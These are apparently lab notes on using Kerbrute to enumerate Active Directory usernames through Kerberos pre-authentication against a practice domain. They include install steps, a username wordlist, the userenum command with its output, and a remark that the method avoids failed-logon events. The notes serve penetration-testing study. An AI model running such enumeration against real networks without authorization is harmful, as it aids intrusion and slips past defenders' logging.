# Enumeration w/ Kerbrute
Enumeration tool used to brute-force and enumerate valid AD users by abusing Kerberos pre-authentication.

## Abusing Pre-Authentication Overview
- By brute-forcing Kerberos pre-authentication, you do not trigger `account failed to log on` events
- When brute-forcing via Kerberos, you can brute-force only by sending a single UDP frame to KDC

## Kerbrute Installation
1) Download from https://github.com/ropnop/kerbrute/releases
2) Rename kerbrute_linux_amd64 to kerbrute
3) Make kerbrute executable

<pre>chmod +x kerbrute</pre>

## Enumerating Users with Kerbrute
Allows you to know which user accounts are on the tagret domain and which accounts could be used to access the network.

1) Cd into directory with kerbrute
2) Download the following wordlist: https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
3) Brute-force user accounts from a Domain Controller
<pre>./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

   __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/10/23 - Ronnie Flathers @ropnop

2023/09/10 18:14:57 >  Using KDC(s):
2023/09/10 18:14:57 >   CONTROLLER.local:88

2023/09/10 18:14:57 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2023/09/10 18:14:57 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2023/09/10 18:14:57 >  Done! Tested 100 usernames (10 valid) in 0.337 seconds
</pre>

